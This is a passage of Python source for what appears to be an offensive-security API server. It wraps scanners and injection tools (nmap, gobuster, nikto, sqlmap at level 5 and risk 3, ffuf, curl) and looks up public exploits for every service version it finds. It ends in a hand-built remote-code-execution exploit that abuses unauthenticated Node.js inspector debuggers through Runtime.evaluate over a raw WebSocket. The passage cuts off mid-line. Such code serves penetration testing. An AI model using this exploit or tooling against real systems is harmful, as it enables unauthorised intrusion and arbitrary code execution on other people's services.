    for c in sorted(cve_list, key=lambda x: float(x.get("cvss") or 0), reverse=True):
        cid = str(c.get("cve_id") or "").upper().strip()
        if not cid or cid in seen:
            continue
        seen.append(cid)
        if len(picked) >= cap:
            break
        picked.append({**c, "cve_id": cid})
    if not picked:
        return {"pocs": [], "poc_total_repos": 0}
    results = await asyncio.gather(
        *[_poc_lookup(c["cve_id"]) for c in picked], return_exceptions=True)
    pocs: List[Dict[str, Any]] = []
    pad_total = 0
    for i, c in enumerate(picked):
        p = results[i] if isinstance(results[i], dict) else {}
        pocs.append({**c, "$poc": p})
        pad_total += int(p.get("total_repos") or 0)
    return {"pocs": pocs, "poc_total_repos": pad_total}


async def _cve_list_from_auto(cve_res: Dict[str, Any]) -> List[Dict[str, Any]]:
    """Flatten _auto_cve_for_services output into [{cve_id, cvss}]."""
    out: List[Dict[str, Any]] = []
    for svc in cve_res.get("cves_by_service") or []:
        for c in svc.get("cves") or []:
            out.append({"cve_id": c.get("cve_id") or "",
                        "cvss": c.get("cvss") or 0,
                        "port": svc.get("port"),
                        "service": svc.get("service", "")})
    return out


def _hostish(token: str) -> bool:
    """Loose hostname/IP heuristic — excludes port-lists, '-' (stdout
    marker), shell junk ('^server', '===', 'grep'…) and bare words so the
    REAL target wins. Hosts must look like hosts: letters/digits/._-:[] and
    contain a dot or colon (IPv6)."""
    t = (token or "").strip().strip("\"'")
    if not t or t == "-":
        return False
    if len(t) > 60:
        return False
    if not re.match(r"^[A-Za-z0-9._\-:\[\]]+$", t):
        return False                      # no shell/URL junk chars
    if "." not in t and ":" not in t:
        return False                      # 'grep', 'echo', '22' — not hosts
    if re.match(r"^[0-9]+\.[0-9]+$", t):
        return False                      # '1.2'-style numeric noise
    return True


def _guess_nmap_target(command: str) -> str:
    """Best-effort extract the nmap target host from a raw shell command
    (nmap [options...] <target>). Returns '' when not parseable."""
    import shlex
    try:
        toks = shlex.split(command or "")
    except Exception:
        return ""
    if not toks or "nmap" not in toks[:2]:
        return ""
    i = toks.index("nmap") + 1
    candidates = []
    option = False
    for t in toks[i:]:
        if t.startswith("-") and t != "-":
            option = True            # an option switch; its value follows
            continue
        if option and not _hostish(t):
            option = False           # bare value of the previous option (-p 22)
            continue
        option = False
        candidates.append(t)
    for t in reversed(candidates):
        if not _hostish(t):
            continue
        if "=" not in t:             # avoid 'file=name' style leftovers
            return t
    return ""


def _guess_target_generic(command: str) -> str:
    """Target for ANY scan command: nmap-specific parse first, else the last
    host-like token (wpscan --url http://x, curl http://x/p, nc x 22...).
    Tokens are URL-normalized (scheme/path stripped) so 'https://nginx.org/'
    yields 'nginx.org', and shell junk is never mistaken for a target."""
    t = _guess_nmap_target(command)
    if t:
        return t
    import shlex
    try:
        toks = shlex.split(command or "")
    except Exception:
        return ""
    for tok in reversed(toks):
        cand = (tok or "").strip().strip("\"'")
        if "://" in cand:
            cand = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.\-]*://", "", cand)
            cand = cand.split("/")[0].split("?")[0].strip()
        elif "/" in cand:
            cand = cand.split("/")[0]    # 'php.net/index' -> 'php.net'
        if "@" in cand and "/" not in cand:
            cand = cand.split("@")[-1]   # 'user@host' -> 'host'
        if cand.startswith("["):
            cand = cand[1:].split("]")[0]            # '[fe80::1]:8080' -> 'fe80::1'
        elif cand.count(":") == 1:
            cand = cand.split(":")[0]    # 'host:443' -> 'host'
        if _hostish(cand):
            return cand
    return ""


# Any command that might leak service/version fingerprints gets the auto-CVE
# hook — nmap, wpscan, sqlmap, banners, MSF modules, curl -I, banner grabs...
_SCAN_CMD_RE = re.compile(
    r"\b(nmap|wpscan|nikto|curl|wget|nc|netcat|ssh|ftp|telnet|smbclient|"
    r"enum4linux|crackmapexec|hydra|whatweb|msfconsole|openssl|nuclei|masscan|"
    r"dnsrecon|dig|host|smtp|pop3|imap|sqlmap|mysql|psql|sqlite3|redis-cli|"
    r"mongosh|mariadb)\b", re.IGNORECASE)


def _extract_generic_versions(stdout: str) -> List[Dict[str, Any]]:
    """Fully GENERIC fingerprint scan — no hardcoded product/version tables.
    Finds multi-part version tokens (8.2p1, 2.4.49, 1.23.0, 6.4.3…) and pairs
    each with the word immediately before it, accepting space / '_' / '-' /
    '/' separators: 'OpenSSH_8.2p1', 'Apache/2.4.49', 'MySQL 8.0.28',
    'SSH-2.0-OpenSSH_8.2p1', 'Server: nginx/1.18.1', 'PHP/8.1.2'…
    Single-part numbers ('apache … 14', '14:32') never match, so prose and
    timestamps can't false-trigger. The product is whatever word sits right
    before the version (the CPE engine resolves the word to its vendor
    product, e.g. 'httpd' → Apache httpd), so nothing is hardcoded."""
    pat = re.compile(
        r"(?<![0-9A-Za-z])([0-9]+(?:\.[0-9A-Za-z_+~]+){1,4})(?![0-9A-Za-z])")
    # Pure protocol tokens — 'HTTP/1.1', 'SSH-2.0' are protocol versions,
    # not service versions. NOT a service-version table, just noise filter.
    _PROTO_WORDS = {"http", "https", "ssh", "tls", "ssl", "smtp", "ftp",
                    "pop3", "imap", "dns", "udp", "tcp", "icmp", "ip", "rdp",
                    "vnc", "ldap", "snmp", "ntp", "irc", "ws", "wss"}
    out: List[Dict[str, Any]] = []
    seen = set()
    for m in pat.finditer(stdout or ""):
        version = m.group(1)
        if len(version) > 24:
            continue
        if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", version):
            continue   # IPv4 address, not a software version
        pm = re.search(r"([A-Za-z]+)[ /_\-]?$", (stdout or "")[:m.start()])
        if not pm:
            continue
        product = pm.group(1)
        if len(product) < 3 or len(product) > 40:
            continue
        if product.lower() in _PROTO_WORDS:
            continue
        key = f"{product.lower()}%%{version}"
        if key in seen:
            continue
        seen.add(key)
        out.append({"product": product, "version": version,
                    "port": "", "service": ""})
    return out


def _parse_wpscan_versions(stdout: str) -> List[Dict[str, Any]]:
    """Parse wpscan output: 'WordPress version 6.4.3' + every
    '[+] plugin/theme: <name> version <ver>' line."""
    out: List[Dict[str, Any]] = []
    seen = set()

    def add(prod: str, ver: str, service: str) -> None:
        prod = (prod or "").strip().lower()
        ver = (ver or "").strip().rstrip(".,;")
        if not prod or not ver:
            return
        key = f"{prod}%%{ver}"
        if key in seen:
            return
        seen.add(key)
        out.append({"product": prod, "version": ver,
                    "port": "", "service": service})

    m = re.search(r"(?i)WordPress\s+version\s+([0-9][\w.\-]*)", stdout or "")
    if m:
        add("wordpress", m.group(1), "wordpress-core")
    for m in re.finditer(
            r"(?im)^\s*\[\+\]\s*(plugin|theme)\s*:\s*([^\s]+)\s+version\s+([^\s]+)",
            stdout or ""):
        add(m.group(2), m.group(3), f"wordpress-{m.group(1)}")
    return out


def _fingerprint_services(stdout: str) -> List[Dict[str, Any]]:
    """Detect which fingerprint format the stdout is and return services with
    product+version. XML → structured; nmap-human → port lines; wpscan →
    wp/plugin/theme versions; anything else → generic banner scan."""
    s = (stdout or "").strip()
    if not s:
        return []
    if s.startswith("<"):
        return _parse_nmap_xml(s).get("open_ports") or []
    head = s[:30000].lower()
    if re.search(r"(?m)^\s*\d+/(tcp|udp)\s+open", head) or "nmap scan report" in head:
        return _nmap_text_services_with_versions(s)
    if re.search(r"wordpress|wp-content|wpscan", head):
        services = _parse_wpscan_versions(s)
        if services:
            return services
    return _extract_generic_versions(s)


async def _enrich_stdout(target: str, scan_command: str,
                         stdout: str) -> Dict[str, Any]:
    """Universal auto-CVE/PoC enrichment — THE hook every tool uses (nmap,
    wpscan, banners, MSF, /api/command, parallel). Parses product+version
    fingerprints (e.g. 'Unbound 1.23.0', 'WordPress 6.4.3'), looks up CVEs +
    PoCs, saves a cve_auto finding (severity from max CVSS), returns the dict
    of fields to merge into the tool result. {} when nothing found — only
    nodes with a real product+version get looked up, nothing is false-CVE'd."""
    if not (stdout and stdout.strip() and _HAS_CVE_ENRICHMENT):
        return {}
    services = _fingerprint_services(stdout[:250_000])
    if not services:
        return {}
    return await _enrich_services(target, scan_command, services)


async def _enrich_services(target: str, scan_command: str,
                           services: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Core CVE+PoC engine shared by every enrichment path."""
    try:
        cve_res = await _auto_cve_for_services(services)
        if not cve_res.get("unique_cves_total"):
            return {}
        add: Dict[str, Any] = {
            "auto_cves": cve_res,
            "cves": cve_res["unique_cves"],
        }
        try:
            poc_res = await _auto_poc_for_cves(await _cve_list_from_auto(cve_res))
            if poc_res.get("poc_total_repos"):
                add["auto_pocs"] = poc_res["pocs"]
                add["poc_total_repos"] = poc_res["poc_total_repos"]
        except Exception as e:
            logger.debug(f"auto-PoC enrichment skipped: {e}")
        max_cvss = max(
            (float(c.get("cvss") or 0) for svc in cve_res["cves_by_service"]
             for c in svc.get("cves", []) if c.get("cvss") is not None),
            default=0.0)
        if max_cvss >= 9.0:
            cve_sev = "critical"
        elif max_cvss >= 7.0:
            cve_sev = "high"
        elif max_cvss >= 4.0:
            cve_sev = "medium"
        else:
            cve_sev = "low"
        await _db.save_finding(
            target, "cve_auto", "vuln",
            "Auto-detected {n} CVEs for {t}{p}".format(
                n=cve_res['unique_cves_total'], t=target,
                p=(f" (PoC/exploits available for {add['poc_total_repos']} repos)"
                   if add.get("poc_total_repos") else "")),
            detail=json.dumps({"cves": cve_res["cves_by_service"][:10],
                               "pocs": add.get("auto_pocs", [])}),
            raw_output=json.dumps(
                {"cves": cve_res, "pocs": add.get("auto_pocs", [])})[:8000],
            severity=cve_sev,
            scan_command=scan_command)
        return add
    except Exception as e:
        logger.debug(f"auto-CVE enrichment skipped: {e}")
        return {}

@app.post("/api/tools/full_port_scan")
async def full_port_scan(req: FullPortScanReq):
    """Two-pass full-range port discovery — finds the ports default nmap
    misses (top-1000 list only). Pass 1 sweeps ALL 65535 TCP ports fast;
    pass 2 runs -sCV against whatever was found. Returns a compact,
    structured payload parsed from nmap XML (raw text would choke context)."""
    import shlex
    min_rate = max(100, min(int(req.min_rate or 1500), 5000))
    cmd1 = (f"nmap -sS -p- -T4 --min-rate {min_rate} -Pn -oX - {shlex.quote(req.target)}")

    if req.background:
        return ojson(await start_background_job(cmd1, track="full_port_scan"))

    sweep = await _run_or_background(cmd1, track="full_port_scan")
    if sweep.get("auto_backgrounded"):
        return ojson(sweep)
    if sweep.get("started") is False:
        return ojson(sweep)  # job cap — surface the error, don't return empty scan
    parsed = _parse_nmap_xml(sweep.get("stdout") or "")
    open_ports = parsed.get("open_ports", [])

    if req.udp:
        cmd_udp = f"nmap -sU --top-ports 100 -T4 -Pn -oX - {shlex.quote(req.target)}"
        udp_res = await _run_or_background(cmd_udp, track="nmap_udp")
        if udp_res.get("auto_backgrounded"):
            return ojson(udp_res)
        udp_parsed = _parse_nmap_xml(udp_res.get("stdout") or "")
        udp_ports = udp_parsed.get("open_ports", [])
        tcp_nums = {p["port"] for p in open_ports}
        for p in udp_ports:
            if p["port"] not in tcp_nums:
                open_ports.append(p)
        open_ports.sort(key=lambda p: p["port"])
        cmd1 += f"  &&  {cmd_udp}"
    if parsed.get("from_regex_fallback") or not open_ports:
        # XML parse failed (e.g. nmap not run as root / mangled XML) — fall
        # back to whitespace-tolerant regex over the human output
        text_ports = _ports_from_nmap_text(sweep.get("stdout") or "")
        if text_ports:
            open_ports = [{"port": p[0], "proto": pr, "service": sv}
                          for p, pr, sv in text_ports]

    result = {
        "target": req.target,
        "scan_command": cmd1,
        "total_open_ports": len(open_ports),
        "open_ports": open_ports[:60],
        "truncated": len(open_ports) > 60,
        "os_guess": parsed.get("os_guess", ""),
        "note": "Default nmap only scans the top-1000 ports. This pass-1 "
                "-p- sweep covers all 65535.",
    }

    # Pass 2: version/service/script detection on discovered ports only
    if req.version_scan and open_ports and not req.background:
        port_list = ",".join(str(p["port"]) for p in open_ports[:100])
        cmd2 = f"nmap -sCV -Pn -p {port_list} -oX - {req.target}"
        deep = await _run_or_background(cmd2, track="nmap_versions")
        if deep.get("auto_backgrounded"):
            return ojson(deep)
        if deep.get("started") is False:
            return ojson({**result, "received_async_error": deep.get("error") or "job not started"})
        deep_parsed = _parse_nmap_xml(deep.get("stdout") or "")
        if deep_parsed.get("open_ports"):
            result["services"] = deep_parsed["open_ports"]
            result["os_guess"] = deep_parsed.get("os_guess", "") or result.get("os_guess", "")
            result["service_scan_command"] = cmd2
            # FIX (M3): auto-CVE lookup on every confirmed product+version
            # (e.g. 'Unbound 1.23.0' from the .1 router) so findings appear
            # without a separate manual search_service_cves call.
            try:
                cve_res = await _auto_cve_for_services(result["services"])
                if cve_res.get("unique_cves_total"):
                    result["auto_cves"] = cve_res
                    result["cves"] = cve_res["unique_cves"]
                    # Auto-PoC for the top detected CVEs (highest CVSS first).
                    try:
                        poc_res = await _auto_poc_for_cves(await _cve_list_from_auto(cve_res))
                        if poc_res["poc_total_repos"]:
                            result["auto_pocs"] = poc_res["pocs"]
                            result["poc_total_repos"] = poc_res["poc_total_repos"]
                    except Exception as e:
                        logger.debug(f"auto-PoC enrichment skipped: {e}")
                    # Severity from the worst CVSS found (critical ≥9, high ≥7,
                    # medium ≥4, else low) — a CVSS 10.0 cache-poisoning CVE
                    # should NOT land as 'info'.
                    max_cvss = max(
                        (float(c.get("cvss") or 0) for svc in cve_res["cves_by_service"]
                         for c in svc.get("cves", []) if c.get("cvss") is not None),
                        default=0.0)
                    if max_cvss >= 9.0:
                        cve_sev = "critical"
                    elif max_cvss >= 7.0:
                        cve_sev = "high"
                    elif max_cvss >= 4.0:
                        cve_sev = "medium"
                    else:
                        cve_sev = "low"
                    await _db.save_finding(
                        req.target, "cve_auto", "vuln",
                        "Auto-detected {n} CVEs for {t}{p}".format(
                            n=cve_res['unique_cves_total'], t=req.target,
                            p=(f" (PoC/exploits available for {result['poc_total_repos']} repos)"
                               if result.get("poc_total_repos") else "")),
                        detail=json.dumps({
                            "cves": cve_res["cves_by_service"][:10],
                            "pocs": result.get("auto_pocs", []),
                        }),
                        raw_output=json.dumps(
                            {"cves": cve_res, "pocs": result.get("auto_pocs", [])})[:8000],
                        severity=cve_sev,
                        scan_command="full_port_scan(auto-CVE+POC hook)")
            except Exception as e:
                logger.debug(f"auto-CVE enrichment skipped: {e}")

    # Save to DB for target profile + smart_analyze
    port_str = ", ".join(f"{p['port']}/{p.get('proto','tcp')}({p.get('service','?')})"
                         for p in open_ports[:60])
    port_json = json.dumps([{"port": f"{p['port']}/{p.get('proto','tcp')}",
                             "service": p.get("service", "?")}
                            for p in open_ports[:60]])
    await _db.update_target(req.target, open_ports=port_str, open_ports_json=port_json)
    await _db.save_finding(req.target, "nmap", "scan", "Full port scan",
                           raw_output=json.dumps(result)[:8000],
                           scan_command="full_port_scan(" + shlex.quote(req.target) + ")")
    return ojson(result)

def _deep_wordlist() -> str:
    """Largest wordlist available on the box — the default common.txt
    (~4600 words) misses admin panels, backups, .env, API paths, etc."""
    for c in [
        "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        "/usr/share/wordlists/dirb/big.txt",
        "/usr/share/wordlists/dirb/common.txt",
    ]:
        if os.path.exists(c):
            return c
    return "/usr/share/wordlists/dirb/common.txt"


@app.post("/api/tools/gobuster")
async def gobuster(req: GobusterReq):
    if req.mode not in ["dir","dns","fuzz","vhost"]:
        raise HTTPException(400, f"Invalid mode: {req.mode}")

    additional = req.additional_args
    # FIX: pruning the blacklist alone doesn't help — gobuster sets
    # --status-codes-blacklist 404 BY DEFAULT, so '--status-codes 200,301'
    # still trips "both are set". Supply an explicit EMPTY blacklist
    # (gobuster's documented way to disable the default).
    has_status_codes = "--status-codes" in additional or "-s " in additional or "-s\t" in additional
    if has_status_codes:
        additional = re.sub(r'--status-codes-blacklist\s+\S+', '', additional)
        additional = re.sub(r'-b\s+\S+', '', additional)  # short form
    if req.status_codes:
        additional += f" --status-codes {req.status_codes}"
        has_status_codes = True
    if has_status_codes:
        additional += ' --status-codes-blacklist ""'

    wordlist = req.wordlist
    if req.deep:
        wordlist = _deep_wordlist()
        if "-x " not in additional and "--extensions" not in additional:
            additional += " -x php,txt,bak,zip,old,sql,log,conf,env,yml,json"
        if "-r" not in additional and "--recursive" not in additional:
            additional += " -r"

    import shlex
    cmd = f"gobuster {req.mode} -u {shlex.quote(req.url)} -w {shlex.quote(wordlist)} {additional}"
    if req.background:
        return ojson(await start_background_job(cmd, track="gobuster"))
    result = await _run_or_background(cmd, track="gobuster")
    if result.get("auto_backgrounded"):
        return ojson(result)
    if result["stdout"]:
        await _db.save_finding(req.url, "gobuster", "web", "Directory scan", raw_output=result["stdout"], scan_command=_redact(cmd))
        # structured path list (dir mode): '/admin (Status: 301) [Size: 307]'
        paths = []
        for line in result["stdout"].splitlines():
            m = re.search(r'^/(.+?)\s+\(Status:\s*(\d+)\)\s*\[Size:\s*(\d+)\]', line)
            if m:
                paths.append({"path": m.group(1), "status": int(m.group(2)),
                              "size": int(m.group(3))})
        if not paths:
            for line in result["stdout"].splitlines():
                m = re.search(r'Found:\s*(\S+)\s+\(Status:\s*(\d+)\)', line)
                if m:
                    paths.append({"path": m.group(1), "status": int(m.group(2)),
                                  "size": 0})
        if paths:
            # FIX (TestSprite TC005): keep the key ALWAYS present so the schema
            # is stable — empty list when the scan found/parsed nothing.
            result["parsed_paths"] = paths[:50]
        else:
            result["parsed_paths"] = []
        result["paths_total"] = len(paths)
        result["paths_truncated"] = len(paths) > 50
        # keep the returned payload lean — full output is in the DB
        if len(result["stdout"]) > 12000:
            result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/dirb")
async def dirb(req: DirbReq):
    # Validate wordlist path exists before running
    wordlist = req.wordlist
    if not os.path.exists(wordlist):
        # Try common fallback paths
        for fallback in ["/usr/share/wordlists/dirb/common.txt",
                         "/usr/share/dirb/wordlists/common.txt",
                         "/usr/share/wordlists/common.txt"]:
            if os.path.exists(fallback):
                wordlist = fallback
                break
        else:
            return ojson({
                "stdout": "", "stderr": f"Wordlist not found: {req.wordlist}. "
                f"Tried fallbacks. Install with: apt install dirb wordlists",
                "return_code": 1, "success": False, "timed_out": False, "elapsed_sec": 0,
                "diagnostic": "wordlist_missing"
            })

    import shlex
    cmd = f"dirb {shlex.quote(req.url)} {shlex.quote(wordlist)} {req.additional_args}"
    if req.deep:
        # dirb has no -x for extensions; recursive (-r) + biggest list is enough
        cmd = f"dirb {shlex.quote(req.url)} {shlex.quote(_deep_wordlist())} -r {req.additional_args}"
    logger.info(f"Dirb command: {_redact(cmd)}")
    result = await _run_or_background(cmd, track="dirb")
    if result.get("auto_backgrounded"):
        return ojson(result)
    if not result["stdout"] and not result["stderr"]:
        result["stderr"] = "Dirb produced no output. Check installation: which dirb"
        result["diagnostic"] = "empty_response"
    if result["stdout"]:
        await _db.save_finding(req.url, "dirb", "web", "Dirb scan", raw_output=result["stdout"], scan_command=_redact(cmd))
        # structured list: '+ http://host/path (CODE:200|SIZE:10918)'
        paths = []
        for line in result["stdout"].splitlines():
            m = re.search(r'\+ (https?://\S+)\s+\(CODE:(\d+)\|SIZE:(\d+)\)', line)
            if m:
                paths.append({"url": m.group(1), "status": int(m.group(2)),
                              "size": int(m.group(3))})
        if paths:
            result["parsed_paths"] = paths[:50]
            result["paths_total"] = len(paths)
            result["paths_truncated"] = len(paths) > 50
        if len(result["stdout"]) > 12000:
            result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/nikto")
async def nikto(req: NiktoReq):
    # FIX: Parse target properly — Nikto can't use -port with a full URI.
    # If target looks like a URL (http://...), extract host/port and use -h host -port port.
    target = req.target.strip()
    host = target
    port_arg = ""

    parsed = urlparse(target if "://" in target else f"http://{target}")
    if parsed.hostname:
        host = parsed.hostname
        try:
            has_port = bool(parsed.port)
        except ValueError:
            has_port = False
        if has_port:
            port_arg = f" -p {parsed.port}"
        elif parsed.scheme == "https":
            port_arg = " -p 443"

    # Build command — do NOT use -port if host already contains it
    additional = req.additional_args
    # Drop conflicting -port / -h flags (we set our own)
    additional = re.sub(r'-port\s+\S+', '', additional)
    additional = re.sub(r'-h\s+\S+', '', additional)

    if req.deep and "-Tuning" not in additional and "-tuning" not in additional:
        # 1=interesting files 2=misconfig 3=info leak 4=injection
        # b=interesting files  d=DoS e=remote source disclosure
        additional += " -Tuning 123bde -Display V"

    if not shutil.which("nikto"):
        return ojson({
            "stdout": "",
            "stderr": "nikto not found. Install: sudo apt install nikto",
            "return_code": 127, "success": False, "timed_out": False, "elapsed_sec": 0,
            "diagnostic": "binary_missing",
            "suggestion": "Install nikto: sudo apt install nikto",
        })

    cmd = f"nikto -h {host}{port_arg} {additional}".strip()
    logger.info(f"Nikto command: {_redact(cmd)}")
    if req.background:
        return ojson(await start_background_job(cmd, track="nikto"))
    result = await _run_or_background(cmd, track="nikto")
    if result.get("auto_backgrounded"):
        return ojson(result)
    # never return an empty error — always keep stderr detail
    if not result["stdout"] and not result["stderr"]:
        result["stderr"] = (
            f"Nikto produced no output for target {req.target}. "
            "Possible causes: host unreachable, no HTTP service on port, "
            "or nikto timed out. Try: curl -sk http://{} to verify connectivity."
        ).format(host)
        result["diagnostic"] = "empty_response"
        result["suggestion"] = "Verify the target is reachable with curl or netcat first."
    elif result["return_code"] not in (0, None) and not result["stdout"]:
        # Non-zero exit but has stderr — include it in structured form
        result["diagnostic"] = "nikto_error"
        result["error_detail"] = result["stderr"][:500]
    if result["stdout"]:
        await _db.save_finding(req.target, "nikto", "web", "Nikto scan", raw_output=result["stdout"], scan_command=_redact(cmd))
    return ojson(result)

@app.post("/api/tools/sqlmap")
async def sqlmap(req: SqlmapReq):
    import shlex
    additional = req.additional_args
    if req.deep:
        # level 5 tests cookies/headers/extra params; risk 3 adds heavy
        # payloads; crawl follows links to find more injection points
        additional = "--batch --level=5 --risk=3 --crawl=2 --smart"
    # FIX: shell-quote url/data so ' and spaces no longer break parsing
    cmd = f"sqlmap -u {shlex.quote(req.url)} {additional}"
    if req.data:
        cmd += f" --data={shlex.quote(req.data)}"
    if req.background:
        return ojson(await start_background_job(cmd, track="sqlmap"))
    result = await _run_or_background(cmd, track="sqlmap")
    if result.get("auto_backgrounded"):
        return ojson(result)
    if result["stdout"]:
        await _db.save_finding(req.url, "sqlmap", "sqli", "SQLMap scan", raw_output=result["stdout"], scan_command=_redact(cmd))
        # compact: keep only the injection findings + summary tail
        lines = result["stdout"].splitlines()
        keep = [l for l in lines if any(k in l.lower() for k in
                ("parameter", "injectable", "is vulnerable", "payload:", "tamper",
                 "database:", "current database", "is it vulnerable", "[info]",
                 "[warning]", "you can check"))]
        if keep and len(result["stdout"]) > 20000:
            result["stdout"] = "\n".join(keep[:120]) + f"\n...[trimmed {len(lines)} lines]"
        # Auto-CVE/PoC hook (FIX M3): sqlmap leaks the back-end stack —
        # 'back-end DBMS: MySQL >= 8.0', 'web application technology: PHP
        # 8.1.2, Apache 2.4.41', banner grabs 'MySQL 8.0.28' — same hook.
        try:
            enrich = await _enrich_stdout(
                req.url, "sqlmap(auto-CVE+POC hook)",
                result["stdout"] + "\n" + (result.get("stderr") or ""))
            if enrich:
                result = {**result, **enrich}
        except Exception as e:
            logger.debug(f"auto-CVE enrichment skipped: {e}")
    return ojson(result)

@app.post("/api/tools/wafw00f")
async def wafw00f(req: WafwooReq):
    import shlex
    cmd = f"wafw00f {shlex.quote(req.url)} {req.additional_args}"
    result = await _run_or_background(cmd, track="wafw00f")
    if result.get("auto_backgrounded"):
        return ojson(result)
    return ojson(result)

@app.post("/api/tools/ffuf")
async def ffuf(req: FfufReq):
    # Per-job JSON output so background scans don't clobber each other
    ffuf_json = f"/tmp/ffuf_out_{uuid.uuid4().hex[:6]}.json"
    wordlist = _deep_wordlist() if req.deep else req.wordlist
    import shlex
    # Normalize the base URL: strip trailing slashes and tolerate a caller
    # that already appended /FUZZ — prevents "-u http://host/FUZZ/FUZZ".
    base = req.url.rstrip("/")
    if re.search(r"/FUZZ$", base, re.IGNORECASE):
        base = base[:-5].rstrip("/")
    cmd = f"ffuf -u {shlex.quote(base + '/FUZZ')} -w {shlex.quote(wordlist)} {req.additional_args} -o {ffuf_json} -of json"
    if req.deep and "-mc" not in req.additional_args:
        cmd += " -mc all -fc 404"
    if req.background:
        bg = await start_background_job(cmd, track="ffuf")
        bg["ffuf_json"] = ffuf_json
        return ojson(bg)
    result = await _run_or_background(cmd, track="ffuf")
    if result.get("auto_backgrounded"):
        result["ffuf_json"] = ffuf_json
        return ojson(result)
    # Try to parse JSON output — compact it so a 100-hit page stays small
    try:
        with open(ffuf_json) as f:
            j = json.load(f)
        results = []
        for r in (j.get("results") or []):
            results.append({
                "url": r.get("url", ""),
                "status": r.get("status", 0),
                "length": r.get("length", 0),
            })
        result["parsed_results"] = results[:50]
        result["results_total"] = len(results)
        result["results_truncated"] = len(results) > 50
        result["ffuf_json"] = ffuf_json
        # drop the full per-request dump from the payload (it's on disk + DB)
        if "json_results" in result:
            del result["json_results"]
    except Exception:
        pass
    if result.get("stdout") and len(result["stdout"]) > 12000:
        result["stdout"] = result["stdout"][:12000] + "\n...[trimmed]"
    return ojson(result)

@app.post("/api/tools/curl")
async def curl_req(req: CurlReq):
    import shlex
    url = _encode_url_safe(req.url) if req.encode_url else req.url
    # FIX: use shlex.quote so single quotes / spaces in SQLi payloads no longer
    # break shell parsing (was: f"...'{req.url}'" which a ' inside the URL closed).
    headers = " ".join(f"-H {shlex.quote(f'{k}: {v}')}" for k, v in req.headers.items())
    data = f"-d {shlex.quote(req.data)}" if req.data else ""
    cmd = f"curl {req.additional_args} -X {req.method} {headers} {data} {shlex.quote(url)}"
    result = await run_command(cmd)
    # a backup zip / huge page / API dump can be MBs — window the body
    if result.get("stdout") and len(result["stdout"]) > 20000:
        out = result["stdout"]
        result["stdout"] = out[:20000] + f"\n...[trimmed {len(out)} bytes total]"
        result["body_truncated"] = True
    return ojson(result)

@app.post("/api/tools/multi_curl")
async def multi_curl(req: MultiCurlReq):
    """Run multiple curl requests in parallel."""
    import shlex
    async def _do_curl(r: CurlReq):
        url = _encode_url_safe(r.url) if r.encode_url else r.url
        headers = " ".join(f"-H {shlex.quote(f'{k}: {v}')}" for k, v in r.headers.items())
        data = f"-d {shlex.quote(r.data)}" if r.data else ""
        cmd = f"curl {r.additional_args} -X {r.method} {headers} {data} {shlex.quote(url)}"
        return await run_command(cmd)

    start = time.monotonic()
    results = await asyncio.gather(*[_do_curl(r) for r in req.requests])
    windowed = []
    for r, res in zip(req.requests, results):
        if res.get("stdout") and len(res["stdout"]) > 8000:
            out = res["stdout"]
            res["stdout"] = out[:8000] + f"\n...[trimmed {len(out)} bytes total]"
            res["body_truncated"] = True
        windowed.append({"url": r.url, **res})
    return ojson({
        "results": windowed,
        "elapsed_sec": round(time.monotonic() - start, 2),
    })

# ─────────────────────────────────────────────
# Node Inspector RCE — CDP over WebSocket
# Exploits `node --inspect[=host:port]` debuggers: an unauthenticated
# Runtime.evaluate on the attached process = arbitrary code execution as
# whoever runs that Node service (e.g. lotus-telemetry -> pipelinesvc).
# Hand-rolled minimal WebSocket client so no extra pip deps are needed.
# ─────────────────────────────────────────────
def _node_inspector_exec(host, port, expression, title_filter, timeout):
    import socket, struct, base64, os, json as _json
    import urllib.request as _urlreq
    base = f"http://{host}:{port}"
    try:
        with _urlreq.urlopen(_urlreq.Request(base + "/json", method="GET"), timeout=timeout) as r:
            targets = _json.loads(r.read().decode(errors="replace"))
    except Exception as e:
        return False, f"inspector http probe failed: {e}"
    if not targets:
        return False, "no targets in inspector /json list"
    target = None
    if title_filter:
        for t in targets:
            if title_filter.lower() in (t.get("title") or "").lower():
                target = t
                break
    if target is None:
        target = targets[0]
    ws_url = target.get("webSocketDebuggerUrl")
    if not ws_url:
        return False, "target has no webSocketDebuggerUrl"

    from urllib.parse import urlparse
    up = urlparse(ws_url)
    ws_host = up.hostname or host
    ws_port = up.port or port
    path = (up.path or "/") + (("?" + up.query) if up.query else "")

    s = socket.create_connection((ws_host, ws_port), timeout=timeout)
    try:
        key = base64.b64encode(os.urandom(16)).decode()
        handshake = (f"GET {path} HTTP/1.1\r\nHost: {ws_host}:{ws_port}\r\n"
                     "Upgrade: websocket\r\nConnection: Upgrade\r\n"
                     f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n")
        s.sendall(handshake.encode())
        d = b""
        s.settimeout(timeout)
        while b"\r\n\r\n" not in d:
            chunk = s.recv(4096)
            if not chunk:
                break
            d += chunk
        if b" 101 " not in d.split(b"\r\n", 1)[0]:
            s.close()
            return False, (d.split(b"\r\n", 1)[0].decode(errors="replace") or "handshake failed")
    except Exception as e:
        s.close()
        return False, f"websocket handshake failed: {e}"

    def _send_text(text):
        payload = text.encode()
        n = len(payload)
        mask = os.urandom(4)
        h = bytearray([0x81])
        if n < 126:
            h.append(0x80 | n)
        elif n < 65536:
            h.append(0x80 | 126)
            h += struct.pack(">H", n)
        else:
            h.append(0x80 | 127)
            h += struct.pack(">Q", n)
        h += mask + bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        s.sendall(bytes(h))

    def _recv_exact(n):
        buf = b""
        while len(buf) < n:
            c = s.recv(n - len(buf))
            if not c:
                raise EOFError("closed")
            buf += c
        return buf

    def _recv_frame():
        b1, b2 = _recv_exact(2)
        ln = b2 & 0x7f
        masked = (b2 & 0x80) != 0
        if ln == 126:
            ln = struct.unpack(">H", _recv_exact(2))[0]
        elif ln == 127:
            ln = struct.unpack(">Q", _recv_exact(8))[0]
        m = _recv_exact(4) if masked else b""
        p = _recv_exact(ln)
        if masked:
            p = bytes(b ^ m[i % 4] for i, b in enumerate(p))
        return b1 & 0x0f, p

    msg = _json.dumps({"id": 1, "method": "Runtime.evaluate",
